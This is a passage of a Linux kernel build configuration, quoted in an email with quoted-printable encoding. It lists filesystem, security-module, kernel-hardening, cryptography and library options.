> # CONFIG_RPCSEC_GSS_KRB5_ENCTYPES_AES_SHA1 is not set
> # CONFIG_RPCSEC_GSS_KRB5_ENCTYPES_CAMELLIA is not set
> # CONFIG_RPCSEC_GSS_KRB5_ENCTYPES_AES_SHA2 is not set
> # CONFIG_SUNRPC_DEBUG is not set
> # CONFIG_SUNRPC_XPRT_RDMA is not set
> CONFIG_CEPH_FS=3Dy
> CONFIG_CEPH_FSCACHE=3Dy
> CONFIG_CEPH_FS_POSIX_ACL=3Dy
> # CONFIG_CEPH_FS_SECURITY_LABEL is not set
> CONFIG_CIFS=3Dy
> # CONFIG_CIFS_STATS2 is not set
> CONFIG_CIFS_ALLOW_INSECURE_LEGACY=3Dy
> CONFIG_CIFS_UPCALL=3Dy
> CONFIG_CIFS_XATTR=3Dy
> CONFIG_CIFS_POSIX=3Dy
> CONFIG_CIFS_DEBUG=3Dy
> # CONFIG_CIFS_DEBUG2 is not set
> # CONFIG_CIFS_DEBUG_DUMP_KEYS is not set
> CONFIG_CIFS_DFS_UPCALL=3Dy
> CONFIG_CIFS_SWN_UPCALL=3Dy
> CONFIG_CIFS_SMB_DIRECT=3Dy
> CONFIG_CIFS_FSCACHE=3Dy
> # CONFIG_CIFS_ROOT is not set
> # CONFIG_CIFS_COMPRESSION is not set
> CONFIG_SMB_SERVER=3Dy
> # CONFIG_SMB_SERVER_SMBDIRECT is not set
> # CONFIG_SMB_SERVER_CHECK_CAP_NET_ADMIN is not set
> # CONFIG_SMB_SERVER_KERBEROS5 is not set
> CONFIG_SMBFS=3Dy
> # CONFIG_CODA_FS is not set
> CONFIG_AFS_FS=3Dy
> # CONFIG_AFS_DEBUG is not set
> CONFIG_AFS_FSCACHE=3Dy
> # CONFIG_AFS_DEBUG_CURSOR is not set
> CONFIG_9P_FS=3Dy
> CONFIG_9P_FSCACHE=3Dy
> CONFIG_9P_FS_POSIX_ACL=3Dy
> CONFIG_9P_FS_SECURITY=3Dy
> CONFIG_NLS=3Dy
> CONFIG_NLS_DEFAULT=3D"utf8"
> CONFIG_NLS_CODEPAGE_437=3Dy
> CONFIG_NLS_CODEPAGE_737=3Dy
> CONFIG_NLS_CODEPAGE_775=3Dy
> CONFIG_NLS_CODEPAGE_850=3Dy
> CONFIG_NLS_CODEPAGE_852=3Dy
> CONFIG_NLS_CODEPAGE_855=3Dy
> CONFIG_NLS_CODEPAGE_857=3Dy
> CONFIG_NLS_CODEPAGE_860=3Dy
> CONFIG_NLS_CODEPAGE_861=3Dy
> CONFIG_NLS_CODEPAGE_862=3Dy
> CONFIG_NLS_CODEPAGE_863=3Dy
> CONFIG_NLS_CODEPAGE_864=3Dy
> CONFIG_NLS_CODEPAGE_865=3Dy
> CONFIG_NLS_CODEPAGE_866=3Dy
> CONFIG_NLS_CODEPAGE_869=3Dy
> CONFIG_NLS_CODEPAGE_936=3Dy
> CONFIG_NLS_CODEPAGE_950=3Dy
> CONFIG_NLS_CODEPAGE_932=3Dy
> CONFIG_NLS_CODEPAGE_949=3Dy
> CONFIG_NLS_CODEPAGE_874=3Dy
> CONFIG_NLS_ISO8859_8=3Dy
> CONFIG_NLS_CODEPAGE_1250=3Dy
> CONFIG_NLS_CODEPAGE_1251=3Dy
> CONFIG_NLS_ASCII=3Dy
> CONFIG_NLS_ISO8859_1=3Dy
> CONFIG_NLS_ISO8859_2=3Dy
> CONFIG_NLS_ISO8859_3=3Dy
> CONFIG_NLS_ISO8859_4=3Dy
> CONFIG_NLS_ISO8859_5=3Dy
> CONFIG_NLS_ISO8859_6=3Dy
> CONFIG_NLS_ISO8859_7=3Dy
> CONFIG_NLS_ISO8859_9=3Dy
> CONFIG_NLS_ISO8859_13=3Dy
> CONFIG_NLS_ISO8859_14=3Dy
> CONFIG_NLS_ISO8859_15=3Dy
> CONFIG_NLS_KOI8_R=3Dy
> CONFIG_NLS_KOI8_U=3Dy
> CONFIG_NLS_MAC_ROMAN=3Dy
> CONFIG_NLS_MAC_CELTIC=3Dy
> CONFIG_NLS_MAC_CENTEURO=3Dy
> CONFIG_NLS_MAC_CROATIAN=3Dy
> CONFIG_NLS_MAC_CYRILLIC=3Dy
> CONFIG_NLS_MAC_GAELIC=3Dy
> CONFIG_NLS_MAC_GREEK=3Dy
> CONFIG_NLS_MAC_ICELAND=3Dy
> CONFIG_NLS_MAC_INUIT=3Dy
> CONFIG_NLS_MAC_ROMANIAN=3Dy
> CONFIG_NLS_MAC_TURKISH=3Dy
> CONFIG_NLS_UTF8=3Dy
> CONFIG_NLS_UCS2_UTILS=3Dy
> CONFIG_DLM=3Dy
> # CONFIG_DLM_DEBUG is not set
> CONFIG_UNICODE=3Dy
> CONFIG_IO_WQ=3Dy
> # end of File systems
>=20
> #
> # Security options
> #
> CONFIG_KEYS=3Dy
> CONFIG_KEYS_REQUEST_CACHE=3Dy
> CONFIG_PERSISTENT_KEYRINGS=3Dy
> CONFIG_BIG_KEYS=3Dy
> CONFIG_TRUSTED_KEYS=3Dy
> # CONFIG_TRUSTED_KEYS_TPM is not set
> # CONFIG_TRUSTED_KEYS_TEE is not set
>=20
> #
> # No trust source selected!
> #
> CONFIG_ENCRYPTED_KEYS=3Dy
> # CONFIG_USER_DECRYPTED_DATA is not set
> CONFIG_KEY_DH_OPERATIONS=3Dy
> CONFIG_KEY_NOTIFICATIONS=3Dy
> # CONFIG_SECURITY_DMESG_RESTRICT is not set
> CONFIG_PROC_MEM_ALWAYS_FORCE=3Dy
> # CONFIG_PROC_MEM_FORCE_PTRACE is not set
> # CONFIG_PROC_MEM_NO_FORCE is not set
> CONFIG_SECURITY=3Dy
> CONFIG_HAS_SECURITY_AUDIT=3Dy
> CONFIG_SECURITYFS=3Dy
> CONFIG_SECURITY_NETWORK=3Dy
> CONFIG_SECURITY_INFINIBAND=3Dy
> CONFIG_SECURITY_NETWORK_XFRM=3Dy
> CONFIG_SECURITY_PATH=3Dy
> # CONFIG_INTEL_TXT is not set
> # CONFIG_STATIC_USERMODEHELPER is not set
> # CONFIG_SECURITY_SELINUX is not set
> # CONFIG_SECURITY_SMACK is not set
> CONFIG_SECURITY_TOMOYO=3Dy
> CONFIG_SECURITY_TOMOYO_MAX_ACCEPT_ENTRY=3D64
> CONFIG_SECURITY_TOMOYO_MAX_AUDIT_LOG=3D32
> CONFIG_SECURITY_TOMOYO_OMIT_USERSPACE_LOADER=3Dy
> CONFIG_SECURITY_TOMOYO_INSECURE_BUILTIN_SETTING=3Dy
> CONFIG_SECURITY_APPARMOR=3Dy
> CONFIG_SECURITY_APPARMOR_DEBUG=3Dy
> CONFIG_SECURITY_APPARMOR_DEBUG_ASSERTS=3Dy
> # CONFIG_SECURITY_APPARMOR_DEBUG_MESSAGES is not set
> CONFIG_SECURITY_APPARMOR_INTROSPECT_POLICY=3Dy
> CONFIG_SECURITY_APPARMOR_HASH=3Dy
> CONFIG_SECURITY_APPARMOR_HASH_DEFAULT=3Dy
> # CONFIG_SECURITY_APPARMOR_EXPORT_BINARY is not set
> # CONFIG_SECURITY_APPARMOR_PARANOID_LOAD is not set
> # CONFIG_SECURITY_LOADPIN is not set
> CONFIG_SECURITY_YAMA=3Dy
> CONFIG_SECURITY_SAFESETID=3Dy
> CONFIG_SECURITY_LOCKDOWN_LSM=3Dy
> CONFIG_SECURITY_LOCKDOWN_LSM_EARLY=3Dy
> CONFIG_LOCK_DOWN_KERNEL_FORCE_NONE=3Dy
> # CONFIG_LOCK_DOWN_KERNEL_FORCE_INTEGRITY is not set
> # CONFIG_LOCK_DOWN_KERNEL_FORCE_CONFIDENTIALITY is not set
> CONFIG_SECURITY_LANDLOCK=3Dy
> # CONFIG_SECURITY_IPE is not set
> CONFIG_INTEGRITY=3Dy
> CONFIG_INTEGRITY_SIGNATURE=3Dy
> CONFIG_INTEGRITY_ASYMMETRIC_KEYS=3Dy
> CONFIG_INTEGRITY_TRUSTED_KEYRING=3Dy
> CONFIG_INTEGRITY_AUDIT=3Dy
> CONFIG_IMA=3Dy
> CONFIG_IMA_MEASURE_PCR_IDX=3D10
> CONFIG_IMA_LSM_RULES=3Dy
> CONFIG_IMA_NG_TEMPLATE=3Dy
> # CONFIG_IMA_SIG_TEMPLATE is not set
> CONFIG_IMA_DEFAULT_TEMPLATE=3D"ima-ng"
> # CONFIG_IMA_DEFAULT_HASH_SHA1 is not set
> CONFIG_IMA_DEFAULT_HASH_SHA256=3Dy
> # CONFIG_IMA_DEFAULT_HASH_SHA512 is not set
> # CONFIG_IMA_DEFAULT_HASH_WP512 is not set
> CONFIG_IMA_DEFAULT_HASH=3D"sha256"
> CONFIG_IMA_WRITE_POLICY=3Dy
> CONFIG_IMA_READ_POLICY=3Dy
> CONFIG_IMA_APPRAISE=3Dy
> # CONFIG_IMA_ARCH_POLICY is not set
> # CONFIG_IMA_APPRAISE_BUILD_POLICY is not set
> # CONFIG_IMA_APPRAISE_BOOTPARAM is not set
> CONFIG_IMA_APPRAISE_MODSIG=3Dy
> # CONFIG_IMA_KEYRINGS_PERMIT_SIGNED_BY_BUILTIN_OR_SECONDARY is not set
> # CONFIG_IMA_BLACKLIST_KEYRING is not set
> # CONFIG_IMA_LOAD_X509 is not set
> CONFIG_IMA_MEASURE_ASYMMETRIC_KEYS=3Dy
> CONFIG_IMA_QUEUE_EARLY_BOOT_KEYS=3Dy
> # CONFIG_IMA_DISABLE_HTABLE is not set
> CONFIG_EVM=3Dy
> CONFIG_EVM_ATTR_FSUUID=3Dy
> CONFIG_EVM_ADD_XATTRS=3Dy
> # CONFIG_EVM_LOAD_X509 is not set
> # CONFIG_DEFAULT_SECURITY_TOMOYO is not set
> CONFIG_DEFAULT_SECURITY_APPARMOR=3Dy
> # CONFIG_DEFAULT_SECURITY_DAC is not set
> CONFIG_LSM=3D"landlock,lockdown,yama,safesetid,integrity,tomoyo,apparmor,=
bpf"
>=20
> #
> # Kernel hardening options
> #
>=20
> #
> # Memory initialization
> #
> CONFIG_INIT_STACK_NONE=3Dy
> CONFIG_INIT_ON_ALLOC_DEFAULT_ON=3Dy
> # CONFIG_INIT_ON_FREE_DEFAULT_ON is not set
> CONFIG_CC_HAS_ZERO_CALL_USED_REGS=3Dy
> # CONFIG_ZERO_CALL_USED_REGS is not set
> # end of Memory initialization
>=20
> #
> # Bounds checking
> #
> CONFIG_FORTIFY_SOURCE=3Dy
> CONFIG_HARDENED_USERCOPY=3Dy
> # CONFIG_HARDENED_USERCOPY_DEFAULT_ON is not set
> # end of Bounds checking
>=20
> #
> # Hardening of kernel data structures
> #
> CONFIG_LIST_HARDENED=3Dy
> CONFIG_BUG_ON_DATA_CORRUPTION=3Dy
> # end of Hardening of kernel data structures
>=20
> CONFIG_RANDSTRUCT_NONE=3Dy
> # end of Kernel hardening options
> # end of Security options
>=20
> CONFIG_XOR_BLOCKS=3Dy
> CONFIG_ASYNC_CORE=3Dy
> CONFIG_ASYNC_MEMCPY=3Dy
> CONFIG_ASYNC_XOR=3Dy
> CONFIG_ASYNC_PQ=3Dy
> CONFIG_ASYNC_RAID6_RECOV=3Dy
> CONFIG_CRYPTO=3Dy
>=20
> #
> # Crypto core or helper
> #
> CONFIG_CRYPTO_ALGAPI=3Dy
> CONFIG_CRYPTO_ALGAPI2=3Dy
> CONFIG_CRYPTO_AEAD=3Dy
> CONFIG_CRYPTO_AEAD2=3Dy
> CONFIG_CRYPTO_SIG=3Dy
> CONFIG_CRYPTO_SIG2=3Dy
> CONFIG_CRYPTO_SKCIPHER=3Dy
> CONFIG_CRYPTO_SKCIPHER2=3Dy
> CONFIG_CRYPTO_HASH=3Dy
> CONFIG_CRYPTO_HASH2=3Dy
> CONFIG_CRYPTO_RNG=3Dy
> CONFIG_CRYPTO_RNG2=3Dy
> CONFIG_CRYPTO_RNG_DEFAULT=3Dy
> CONFIG_CRYPTO_AKCIPHER2=3Dy
> CONFIG_CRYPTO_AKCIPHER=3Dy
> CONFIG_CRYPTO_KPP2=3Dy
> CONFIG_CRYPTO_KPP=3Dy
> CONFIG_CRYPTO_ACOMP2=3Dy
> CONFIG_CRYPTO_MANAGER=3Dy
> CONFIG_CRYPTO_MANAGER2=3Dy
> CONFIG_CRYPTO_USER=3Dy
> # CONFIG_CRYPTO_SELFTESTS is not set
> CONFIG_CRYPTO_NULL=3Dy
> CONFIG_CRYPTO_PCRYPT=3Dy
> CONFIG_CRYPTO_CRYPTD=3Dy
> CONFIG_CRYPTO_AUTHENC=3Dy
> CONFIG_CRYPTO_KRB5ENC=3Dy
> # CONFIG_CRYPTO_BENCHMARK is not set
> CONFIG_CRYPTO_ENGINE=3Dy
> # end of Crypto core or helper
>=20
> #
> # Public-key cryptography
> #
> CONFIG_CRYPTO_RSA=3Dy
> CONFIG_CRYPTO_DH=3Dy
> # CONFIG_CRYPTO_DH_RFC7919_GROUPS is not set
> CONFIG_CRYPTO_ECC=3Dy
> CONFIG_CRYPTO_ECDH=3Dy
> CONFIG_CRYPTO_ECDSA=3Dy
> CONFIG_CRYPTO_ECRDSA=3Dy
> # CONFIG_CRYPTO_MLDSA is not set
> # end of Public-key cryptography
>=20
> #
> # Block ciphers
> #
> CONFIG_CRYPTO_AES=3Dy
> CONFIG_CRYPTO_ANUBIS=3Dy
> CONFIG_CRYPTO_ARIA=3Dy
> CONFIG_CRYPTO_BLOWFISH=3Dy
> CONFIG_CRYPTO_BLOWFISH_COMMON=3Dy
> CONFIG_CRYPTO_CAMELLIA=3Dy
> CONFIG_CRYPTO_CAST_COMMON=3Dy
> CONFIG_CRYPTO_CAST5=3Dy
> CONFIG_CRYPTO_CAST6=3Dy
> CONFIG_CRYPTO_DES=3Dy
> CONFIG_CRYPTO_FCRYPT=3Dy
> CONFIG_CRYPTO_KHAZAD=3Dy
> CONFIG_CRYPTO_SEED=3Dy
> CONFIG_CRYPTO_SERPENT=3Dy
> CONFIG_CRYPTO_SM4=3Dy
> CONFIG_CRYPTO_SM4_GENERIC=3Dy
> CONFIG_CRYPTO_TEA=3Dy
> CONFIG_CRYPTO_TWOFISH=3Dy
> CONFIG_CRYPTO_TWOFISH_COMMON=3Dy
> # end of Block ciphers
>=20
> #
> # Length-preserving ciphers and modes
> #
> CONFIG_CRYPTO_ADIANTUM=3Dy
> CONFIG_CRYPTO_ARC4=3Dy
> CONFIG_CRYPTO_CHACHA20=3Dy
> CONFIG_CRYPTO_CBC=3Dy
> CONFIG_CRYPTO_CTR=3Dy
> CONFIG_CRYPTO_CTS=3Dy
> CONFIG_CRYPTO_ECB=3Dy
> CONFIG_CRYPTO_HCTR2=3Dy
> CONFIG_CRYPTO_LRW=3Dy
> CONFIG_CRYPTO_PCBC=3Dy
> CONFIG_CRYPTO_XCTR=3Dy
> CONFIG_CRYPTO_XTS=3Dy
> # end of Length-preserving ciphers and modes
>=20
> #
> # AEAD (authenticated encryption with associated data) ciphers
> #
> CONFIG_CRYPTO_AEGIS128=3Dy
> CONFIG_CRYPTO_CHACHA20POLY1305=3Dy
> CONFIG_CRYPTO_CCM=3Dy
> CONFIG_CRYPTO_GCM=3Dy
> CONFIG_CRYPTO_GENIV=3Dy
> CONFIG_CRYPTO_SEQIV=3Dy
> CONFIG_CRYPTO_ECHAINIV=3Dy
> CONFIG_CRYPTO_ESSIV=3Dy
> # end of AEAD (authenticated encryption with associated data) ciphers
>=20
> #
> # Hashes, digests, and MACs
> #
> CONFIG_CRYPTO_BLAKE2B=3Dy
> CONFIG_CRYPTO_CMAC=3Dy
> CONFIG_CRYPTO_GHASH=3Dy
> CONFIG_CRYPTO_HMAC=3Dy
> # CONFIG_CRYPTO_MD4 is not set
> CONFIG_CRYPTO_MD5=3Dy
> CONFIG_CRYPTO_MICHAEL_MIC=3Dy
> CONFIG_CRYPTO_RMD160=3Dy
> CONFIG_CRYPTO_SHA1=3Dy
> CONFIG_CRYPTO_SHA256=3Dy
> CONFIG_CRYPTO_SHA512=3Dy
> CONFIG_CRYPTO_SHA3=3Dy
> # CONFIG_CRYPTO_SM3_GENERIC is not set
> CONFIG_CRYPTO_STREEBOG=3Dy
> CONFIG_CRYPTO_WP512=3Dy
> CONFIG_CRYPTO_XCBC=3Dy
> CONFIG_CRYPTO_XXHASH=3Dy
> # end of Hashes, digests, and MACs
>=20
> #
> # CRCs (cyclic redundancy checks)
> #
> CONFIG_CRYPTO_CRC32C=3Dy
> # CONFIG_CRYPTO_CRC32 is not set
> # end of CRCs (cyclic redundancy checks)
>=20
> #
> # Compression
> #
> CONFIG_CRYPTO_DEFLATE=3Dy
> CONFIG_CRYPTO_LZO=3Dy
> CONFIG_CRYPTO_842=3Dy
> CONFIG_CRYPTO_LZ4=3Dy
> CONFIG_CRYPTO_LZ4HC=3Dy
> CONFIG_CRYPTO_ZSTD=3Dy
> # end of Compression
>=20
> #
> # Random number generation
> #
> CONFIG_CRYPTO_DRBG_MENU=3Dy
> CONFIG_CRYPTO_DRBG_HMAC=3Dy
> CONFIG_CRYPTO_DRBG_HASH=3Dy
> CONFIG_CRYPTO_DRBG_CTR=3Dy
> CONFIG_CRYPTO_DRBG=3Dy
> CONFIG_CRYPTO_JITTERENTROPY=3Dy
> CONFIG_CRYPTO_JITTERENTROPY_MEMORY_BLOCKS=3D64
> CONFIG_CRYPTO_JITTERENTROPY_MEMORY_BLOCKSIZE=3D32
> CONFIG_CRYPTO_JITTERENTROPY_OSR=3D1
> CONFIG_CRYPTO_KDF800108_CTR=3Dy
> CONFIG_CRYPTO_DF80090A=3Dy
> # end of Random number generation
>=20
> #
> # Userspace interface
> #
> CONFIG_CRYPTO_USER_API=3Dy
> CONFIG_CRYPTO_USER_API_HASH=3Dy
> CONFIG_CRYPTO_USER_API_SKCIPHER=3Dy
> CONFIG_CRYPTO_USER_API_RNG=3Dy
> # CONFIG_CRYPTO_USER_API_RNG_CAVP is not set
> CONFIG_CRYPTO_USER_API_AEAD=3Dy
> CONFIG_CRYPTO_USER_API_ENABLE_OBSOLETE=3Dy
> # end of Userspace interface
>=20
> #
> # Accelerated Cryptographic Algorithms for CPU (x86)
> #
> CONFIG_CRYPTO_AES_NI_INTEL=3Dy
> CONFIG_CRYPTO_BLOWFISH_X86_64=3Dy
> CONFIG_CRYPTO_CAMELLIA_X86_64=3Dy
> CONFIG_CRYPTO_CAMELLIA_AESNI_AVX_X86_64=3Dy
> CONFIG_CRYPTO_CAMELLIA_AESNI_AVX2_X86_64=3Dy
> CONFIG_CRYPTO_CAST5_AVX_X86_64=3Dy
> CONFIG_CRYPTO_CAST6_AVX_X86_64=3Dy
> CONFIG_CRYPTO_DES3_EDE_X86_64=3Dy
> CONFIG_CRYPTO_SERPENT_SSE2_X86_64=3Dy
> CONFIG_CRYPTO_SERPENT_AVX_X86_64=3Dy
> CONFIG_CRYPTO_SERPENT_AVX2_X86_64=3Dy
> CONFIG_CRYPTO_SM4_AESNI_AVX_X86_64=3Dy
> CONFIG_CRYPTO_SM4_AESNI_AVX2_X86_64=3Dy
> CONFIG_CRYPTO_TWOFISH_X86_64=3Dy
> CONFIG_CRYPTO_TWOFISH_X86_64_3WAY=3Dy
> CONFIG_CRYPTO_TWOFISH_AVX_X86_64=3Dy
> CONFIG_CRYPTO_ARIA_AESNI_AVX_X86_64=3Dy
> # CONFIG_CRYPTO_ARIA_AESNI_AVX2_X86_64 is not set
> # CONFIG_CRYPTO_ARIA_GFNI_AVX512_X86_64 is not set
> CONFIG_CRYPTO_AEGIS128_AESNI_SSE2=3Dy
> CONFIG_CRYPTO_SM3_AVX_X86_64=3Dy
> CONFIG_CRYPTO_GHASH_CLMUL_NI_INTEL=3Dy
> # end of Accelerated Cryptographic Algorithms for CPU (x86)
>=20
> CONFIG_CRYPTO_HW=3Dy
> CONFIG_CRYPTO_DEV_PADLOCK=3Dy
> CONFIG_CRYPTO_DEV_PADLOCK_AES=3Dy
> CONFIG_CRYPTO_DEV_PADLOCK_SHA=3Dy
> # CONFIG_CRYPTO_DEV_ATMEL_ECC is not set
> # CONFIG_CRYPTO_DEV_ATMEL_SHA204A is not set
> CONFIG_CRYPTO_DEV_CCP=3Dy
> CONFIG_CRYPTO_DEV_CCP_DD=3Dy
> # CONFIG_CRYPTO_DEV_SP_CCP is not set
> # CONFIG_CRYPTO_DEV_NITROX_CNN55XX is not set
> CONFIG_CRYPTO_DEV_QAT=3Dy
> CONFIG_CRYPTO_DEV_QAT_DH895xCC=3Dy
> CONFIG_CRYPTO_DEV_QAT_C3XXX=3Dy
> CONFIG_CRYPTO_DEV_QAT_C62X=3Dy
> # CONFIG_CRYPTO_DEV_QAT_4XXX is not set
> # CONFIG_CRYPTO_DEV_QAT_420XX is not set
> # CONFIG_CRYPTO_DEV_QAT_6XXX is not set
> CONFIG_CRYPTO_DEV_QAT_DH895xCCVF=3Dy
> CONFIG_CRYPTO_DEV_QAT_C3XXXVF=3Dy
> CONFIG_CRYPTO_DEV_QAT_C62XVF=3Dy
> # CONFIG_CRYPTO_DEV_QAT_ERROR_INJECTION is not set
> CONFIG_CRYPTO_DEV_VIRTIO=3Dy
> # CONFIG_CRYPTO_DEV_SAFEXCEL is not set
> # CONFIG_CRYPTO_DEV_CCREE is not set
> # CONFIG_CRYPTO_DEV_AMLOGIC_GXL is not set
> CONFIG_ASYMMETRIC_KEY_TYPE=3Dy
> CONFIG_ASYMMETRIC_PUBLIC_KEY_SUBTYPE=3Dy
> CONFIG_X509_CERTIFICATE_PARSER=3Dy
> CONFIG_PKCS8_PRIVATE_KEY_PARSER=3Dy
> CONFIG_PKCS7_MESSAGE_PARSER=3Dy
> CONFIG_PKCS7_TEST_KEY=3Dy
> CONFIG_SIGNED_PE_FILE_VERIFICATION=3Dy
> # CONFIG_FIPS_SIGNATURE_SELFTEST is not set
>=20
> #
> # Certificates for signature checking
> #
> CONFIG_MODULE_SIG_KEY=3D"certs/signing_key.pem"
> CONFIG_MODULE_SIG_KEY_TYPE_RSA=3Dy
> CONFIG_SYSTEM_TRUSTED_KEYRING=3Dy
> CONFIG_SYSTEM_TRUSTED_KEYS=3D""
> # CONFIG_SYSTEM_EXTRA_CERTIFICATE is not set
> CONFIG_SECONDARY_TRUSTED_KEYRING=3Dy
> # CONFIG_SECONDARY_TRUSTED_KEYRING_SIGNED_BY_BUILTIN is not set
> # CONFIG_SYSTEM_BLACKLIST_KEYRING is not set
> # end of Certificates for signature checking
>=20
> CONFIG_CRYPTO_KRB5=3Dy
> # CONFIG_CRYPTO_KRB5_SELFTESTS is not set
> CONFIG_BINARY_PRINTF=3Dy
>=20
> #
> # Library routines
> #
> CONFIG_RAID6_PQ=3Dy
> # CONFIG_RAID6_PQ_BENCHMARK is not set
> CONFIG_LINEAR_RANGES=3Dy
> # CONFIG_PACKING is not set
> CONFIG_BITREVERSE=3Dy
> CONFIG_GENERIC_STRNCPY_FROM_USER=3Dy
> CONFIG_GENERIC_STRNLEN_USER=3Dy
> CONFIG_GENERIC_NET_UTILS=3Dy
> # CONFIG_CORDIC is not set
> # CONFIG_PRIME_NUMBERS is not set
> CONFIG_RATIONAL=3Dy
> CONFIG_GENERIC_IOMAP=3Dy
> CONFIG_ARCH_USE_CMPXCHG_LOCKREF=3Dy
> CONFIG_ARCH_HAS_FAST_MULTIPLIER=3Dy
> CONFIG_ARCH_USE_SYM_ANNOTATIONS=3Dy
> CONFIG_CRC8=3Dy
> CONFIG_CRC16=3Dy
> CONFIG_CRC_CCITT=3Dy
> CONFIG_CRC_ITU_T=3Dy
> CONFIG_CRC_T10DIF=3Dy
> CONFIG_CRC_T10DIF_ARCH=3Dy
> CONFIG_CRC32=3Dy
> CONFIG_CRC32_ARCH=3Dy
> CONFIG_CRC64=3Dy
> CONFIG_CRC64_ARCH=3Dy
> CONFIG_CRC_OPTIMIZATIONS=3Dy
>=20
> #
> # Crypto library routines
> #
> CONFIG_CRYPTO_HASH_INFO=3Dy
> CONFIG_CRYPTO_LIB_UTILS=3Dy
> CONFIG_CRYPTO_LIB_AES=3Dy
> CONFIG_CRYPTO_LIB_AES_ARCH=3Dy
> CONFIG_CRYPTO_LIB_ARC4=3Dy
> CONFIG_CRYPTO_LIB_GF128MUL=3Dy
> CONFIG_CRYPTO_LIB_BLAKE2B=3Dy
> CONFIG_CRYPTO_LIB_BLAKE2S_ARCH=3Dy
> CONFIG_CRYPTO_LIB_CHACHA=3Dy
> CONFIG_CRYPTO_LIB_CHACHA_ARCH=3Dy
> CONFIG_CRYPTO_LIB_CURVE25519=3Dy
> CONFIG_CRYPTO_LIB_CURVE25519_ARCH=3Dy
> CONFIG_CRYPTO_LIB_CURVE25519_GENERIC=3Dy
> CONFIG_CRYPTO_LIB_DES=3Dy
> CONFIG_CRYPTO_LIB_MD5=3Dy
> CONFIG_CRYPTO_LIB_NH=3Dy
> CONFIG_CRYPTO_LIB_NH_ARCH=3Dy
> CONFIG_CRYPTO_LIB_POLY1305=3Dy
> CONFIG_CRYPTO_LIB_POLY1305_ARCH=3Dy
> CONFIG_CRYPTO_LIB_POLY1305_GENERIC=3Dy
> CONFIG_CRYPTO_LIB_POLY1305_RSIZE=3D11
> CONFIG_CRYPTO_LIB_POLYVAL=3Dy
> CONFIG_CRYPTO_LIB_POLYVAL_ARCH=3Dy
> CONFIG_CRYPTO_LIB_CHACHA20POLY1305=3Dy
> CONFIG_CRYPTO_LIB_SHA1=3Dy
> CONFIG_CRYPTO_LIB_SHA1_ARCH=3Dy
> CONFIG_CRYPTO_LIB_SHA256=3Dy
> CONFIG_CRYPTO_LIB_SHA256_ARCH=3Dy
> CONFIG_CRYPTO_LIB_SHA512=3Dy
> CONFIG_CRYPTO_LIB_SHA512_ARCH=3Dy
> CONFIG_CRYPTO_LIB_SHA3=3Dy
> CONFIG_CRYPTO_LIB_SM3=3Dy
> # end of Crypto library routines
>=20
> CONFIG_XXHASH=3Dy
> # CONFIG_RANDOM32_SELFTEST is not set
> CONFIG_842_COMPRESS=3Dy
> CONFIG_842_DECOMPRESS=3Dy
> CONFIG_ZLIB_INFLATE=3Dy
> CONFIG_ZLIB_DEFLATE=3Dy
> CONFIG_LZO_COMPRESS=3Dy
> CONFIG_LZO_DECOMPRESS=3Dy
> CONFIG_LZ4_COMPRESS=3Dy
> CONFIG_LZ4HC_COMPRESS=3Dy
> CONFIG_LZ4_DECOMPRESS=3Dy
> CONFIG_ZSTD_COMMON=3Dy
> CONFIG_ZSTD_COMPRESS=3Dy
> CONFIG_ZSTD_DECOMPRESS=3Dy
> CONFIG_XZ_DEC=3Dy
> CONFIG_XZ_DEC_X86=3Dy
> CONFIG_XZ_DEC_POWERPC=3Dy
> CONFIG_XZ_DEC_ARM=3Dy
> CONFIG_XZ_DEC_ARMTHUMB=3Dy
> CONFIG_XZ_DEC_ARM64=3Dy
> CONFIG_XZ_DEC_SPARC=3Dy
> CONFIG_XZ_DEC_RISCV=3Dy
> # CONFIG_XZ_DEC_MICROLZMA is not set
> CONFIG_XZ_DEC_BCJ=3Dy
> # CONFIG_XZ_DEC_TEST is not set
> CONFIG_DECOMPRESS_GZIP=3Dy
> CONFIG_DECOMPRESS_BZIP2=3Dy
> CONFIG_DECOMPRESS_LZMA=3Dy
> CONFIG_DECOMPRESS_XZ=3Dy
> CONFIG_DECOMPRESS_LZO=3Dy
> CONFIG_DECOMPRESS_LZ4=3Dy
> CONFIG_DECOMPRESS_ZSTD=3Dy
> CONFIG_GENERIC_ALLOCATOR=3Dy
> CONFIG_REED_SOLOMON=3Dy
> CONFIG_REED_SOLOMON_DEC8=3Dy
> CONFIG_TEXTSEARCH=3Dy
> CONFIG_TEXTSEARCH_KMP=3Dy
> CONFIG_TEXTSEARCH_BM=3Dy
> CONFIG_TEXTSEARCH_FSM=3Dy
> CONFIG_INTERVAL_TREE=3Dy
> CONFIG_INTERVAL_TREE_SPAN_ITER=3Dy
> CONFIG_XARRAY_MULTI=3Dy
> CONFIG_ASSOCIATIVE_ARRAY=3Dy
> CONFIG_CLOSURES=3Dy
> CONFIG_HAS_IOMEM=3Dy
> CONFIG_HAS_IOPORT=3Dy
> CONFIG_HAS_IOPORT_MAP=3Dy
> CONFIG_HAS_DMA=3Dy
> CONFIG_DMA_OPS_HELPERS=3Dy
> CONFIG_NEED_SG_DMA_FLAGS=3Dy
> CONFIG_NEED_SG_DMA_LENGTH=3Dy
> CONFIG_NEED_DMA_MAP_STATE=3Dy
> CONFIG_ARCH_DMA_ADDR_T_64BIT=3Dy
> CONFIG_DMA_DECLARE_COHERENT=3Dy
> CONFIG_SWIOTLB=3Dy
> # CONFIG_SWIOTLB_DYNAMIC is not set
> CONFIG_DMA_NEED_SYNC=3Dy
> # CONFIG_DMA_RESTRICTED_POOL is not set
> CONFIG_DMA_CMA=3Dy
> # CONFIG_DMA_NUMA_CMA is not set
>=20
> #
> # Default contiguous memory area size:
> #
> CONFIG_CMA_SIZE_MBYTES=3D0
> CONFIG_CMA_SIZE_PERCENTAGE=3D0
> # CONFIG_CMA_SIZE_SEL_MBYTES is not set
> # CONFIG_CMA_SIZE_SEL_PERCENTAGE is not set
> # CONFIG_CMA_SIZE_SEL_MIN is not set
> CONFIG_CMA_SIZE_SEL_MAX=3Dy
> CONFIG_CMA_ALIGNMENT=3D8
> # CONFIG_DMA_API_DEBUG is not set
> # CONFIG_DMA_MAP_BENCHMARK is not set
> CONFIG_SGL_ALLOC=3Dy
> CONFIG_CHECK_SIGNATURE=3Dy
> # CONFIG_CPUMASK_OFFSTACK is not set
> CONFIG_CPU_RMAP=3Dy
> CONFIG_DQL=3Dy
> CONFIG_GLOB=3Dy
> CONFIG_NLATTR=3Dy
> CONFIG_CLZ_TAB=3Dy
> CONFIG_IRQ_POLL=3Dy
> CONFIG_MPILIB=3Dy
> CONFIG_SIGNATURE=3Dy
> CONFIG_DIMLIB=3Dy
